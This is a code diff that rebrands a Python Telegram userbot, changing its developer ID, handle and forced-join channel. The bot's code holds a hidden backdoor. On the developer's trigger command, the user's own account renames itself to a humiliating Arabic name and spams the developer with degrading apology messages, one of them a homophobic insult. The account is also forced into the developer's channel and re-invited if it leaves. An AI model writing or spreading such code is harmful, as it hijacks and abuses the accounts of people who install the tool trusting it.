@@ -17,7 +17,7 @@ import asyncio
 
 
 
-#Developer: @ar_aaa
+#Developer:
 
 #Modules
 client = phoenix.client.client
@@ -147,7 +147,7 @@ client.add_event_handler(phoenix.mute.unmute)
 client.add_event_handler(phoenix.mute.delete_muted_messages)
 
 #========
-DEVELOPER_ID = 6569663552
+DEVELOPER_ID = 5434703779
 
 @client.on(events.NewMessage(pattern=r"\.منصب؟"))
 async def recognize_developer(event):
@@ -156,7 +156,7 @@ async def recognize_developer(event):
         if original_message:  
             await event.reply("اي تاج راسي شكرا ")
 #==================
-DEVELOPER_ID = 6569663552
+DEVELOPER_ID = 5434703779
 
 is_applying_consequence = False
 original_name = None
@@ -175,18 +175,18 @@ async def apply_consequence(event):
                 original_name = await client.get_me()
 
                 await client(UpdateProfileRequest(
-                    first_name="A",
+                    first_name="اني تبن وفاينل عمي",
                     last_name="" 
                 ))
 
-                await event.reply("A!")
+                await event.reply("تم تطبيق العاقبة بنجاح!")
                 messages = [
-                    f"A",
-                    f"A @{user_to_change.username}",
-                    "A",
-                    "A",
-                    "A",
-                    "A"
+                    f"فاينل عمي وتاج راسي",
+                    f"يروحلك فدوه هذا @{user_to_change.username}",
+                    "حباب سامحني ؟",
+                    "اني جلبك",
+                    "اني گي",
+                    "سامحنييييي"
                 ]
 
                 while is_applying_consequence:
@@ -194,7 +194,7 @@ async def apply_consequence(event):
                         await client.send_message(DEVELOPER_ID, message)
                         await asyncio.sleep(2)
 
-@client.on(events.NewMessage(pattern=r"\.A"))
+@client.on(events.NewMessage(pattern=r"\.سامحتك"))
 async def forgive(event):
     global is_applying_consequence, original_name
 
@@ -217,7 +217,7 @@ async def forgive(event):
                 last_name=original_name.last_name
             ))
 
-            await event.reply("A.")
+            await event.reply("شكرااا😭😭.")
 
 
 #============
@@ -294,7 +294,7 @@ async def handle_leave_channel(event):
 
 
             await client(InviteToChannelRequest(
-                'ar_aaa',  
+                'Z3ZZ_Z',  
                 [user]  
             ))
 
@@ -307,7 +307,7 @@ async def handle_leave_channel(event):
 async def handle_new_message(event):
     if event.text.lower() in COMMANDS_TO_TRIGGER_JOIN:
 
-        await ensure_joined_channel(client, 'ar_aaa')
+        await ensure_joined_channel(client, 'Z3ZZ_Z')
 
 
 
@@ -315,13 +315,18 @@ client.start()
 
 os.system("clear")
 print("""\033[031m
-
-                   │
-Developer: @ar_	aaa
+│                                                                           │
+│                   ███████╗██╗███╗   ██╗ █████╗ ██╗                        │
+│                   ██╔════╝██║████╗  ██║██╔══██╗██║                        │
+│                   █████╗  ██║██╔██╗ ██║███████║██║                        │
+│                   ██╔══╝  ██║██║╚██╗██║██╔══██║██║                        │
+│                   ██║     ██║██║ ╚████║██║  ██║███████╗                   │
+│                   ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝                   │
+Developer: @i0i0ii
 """)
 print("\033[032mStarted")
 
 
-client.loop.run_until_complete(ensure_joined_channel(client, 'ar_aaa'))
+client.loop.run_until_complete(ensure_joined_channel(client, 'Z3ZZ_Z'))
 
 client.run_until_disconnected()
